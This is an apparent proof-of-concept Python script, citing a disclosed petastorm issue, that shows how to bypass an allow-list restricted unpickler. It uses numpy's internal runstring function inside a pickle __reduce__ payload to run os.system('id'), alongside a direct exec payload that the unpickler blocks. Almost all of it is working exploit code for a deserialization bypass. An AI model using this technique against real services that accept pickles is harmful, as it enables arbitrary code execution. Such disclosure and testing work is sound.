import pickle

"""
This PoC draws from a disclosed bypass of the uber/petastorm restricted unpickler.
Source: https://github.com/uber/petastorm/issues/741
"""

# Create two different payload objects with malicious code fragments

# Create a payload object that does not implement the bypass
class DirectPayload(object):
    def __reduce__(self):
        # The exec function is called to execute malicious code
        return (exec, ('__import__("os").system("id")', {}))


# Create a payload object that does implement the bypass
# This payload objects imports a dangerous function call within NumPy
class BypassPayload(object):
    def __reduce__(self):
        # numpy.testing._private.utils.runstring is used similarly to exec
        from numpy.testing._private.utils import runstring

        return (runstring, ('__import__("os").system("id")', {}))


print("Saving the direct payload as a pickle file")
direct_payload = DirectPayload()

with open("direct_payload.pkl", "wb") as f:
    pickle.dump(direct_payload, f)

print("Saving the bypass payload as a pickle file")
bypass_payload = BypassPayload()

with open("bypass_payload.pkl", "wb") as f:
    pickle.dump(bypass_payload, f)

# Construct a restricted unpickler
# This restricted unpickler comes from the uber/petastorm library
safe_modules = {"federatedml", "numpy", "fate_flow"}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        package_name = module.split(".")[0]
        if package_name in safe_modules:
            return super().find_class(module, name)

        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


with open("bypass_payload.pkl", "rb") as f:
    print("Loading the bypass payload using the restricted unpickler")
    Unpickler = RestrictedUnpickler
    unpickler = Unpickler(f)
    unpickler.load()
    print("The restricted unpickler bypass was successful")

with open("direct_payload.pkl", "rb") as f:
    print("Loading the direct payload using the restricted unpickler")
    try:
        Unpickler = RestrictedUnpickler
        unpickler = Unpickler(f)
        unpickler.load()
    except pickle.UnpicklingError as e:
        print(
            "The restricted unpickler was unable to load the direct payload. The following UnpicklingError was raised as expected: ",
            e,
        )
    except Exception as e:
        assert False, f"An unexpected exception was raised: {e}"
    else:
        assert False, "No exception was raised when one was expected."
